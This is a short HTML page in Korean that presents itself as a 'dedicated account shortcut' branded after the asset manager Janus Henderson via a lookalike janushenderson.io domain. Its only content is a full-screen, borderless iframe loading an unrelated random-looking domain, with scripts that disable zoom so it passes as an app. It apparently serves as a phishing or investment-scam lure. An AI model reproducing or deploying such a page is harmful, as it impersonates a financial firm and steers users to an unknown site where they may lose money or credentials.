<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">

    <title>전용계좌 바로가기</title>
    <link rel="icon" type="image/png" href="../app.png">
  
    <link rel="manifest" href="../manifest.json">
    <meta name="theme-color" content="#111111">
    <link rel="apple-touch-icon" href="../JHOne/app2.png">
  
    <meta property="og:title" content="전용계좌 바로가기">
    <meta property="og:description" content="클릭하여 전용 계좌 서비스를 이용하세요">
    <meta property="og:image" content="https://janushenderson.io/app/JHOne/app2.png">
    <meta property="og:url" content="https://janushenderson.io/app/JHOne/handel/">
    <meta property="og:type" content="website">

    <style>
        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            touch-action: manipulation;
        }

        iframe {
            display: block;
            width: 100%;
            height: 100dvh;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="https://www.njvksdfa.com"></iframe>

    <script>
        document.addEventListener("gesturestart", function (event) {
            event.preventDefault();
        });

        document.addEventListener("touchmove", function (event) {
            if (event.touches && event.touches.length > 1) {
                event.preventDefault();
            }
        }, { passive: false });
    </script>
</body>
</html>
